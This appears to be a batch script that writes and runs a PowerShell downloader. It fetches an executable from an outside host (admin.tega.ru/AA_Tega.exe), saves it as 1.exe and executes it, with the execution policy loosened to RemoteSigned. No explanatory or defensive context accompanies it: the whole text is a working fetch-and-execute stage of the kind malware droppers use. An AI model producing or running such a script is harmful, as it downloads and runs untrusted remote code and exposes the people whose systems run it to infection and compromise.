echo $Url = "http://admin.tega.ru/AA_Tega.exe" >1.ps1
echo $Path = "$pwd\1.exe">> 1.ps1
echo $WebClient = New-Object System.Net.WebClient>> 1.ps1
echo $WebClient.DownloadFile($url,$path)>> 1.ps1
echo .\1.exe>> 1.ps1
powershell -executionpolicy RemoteSigned -file 1.ps1
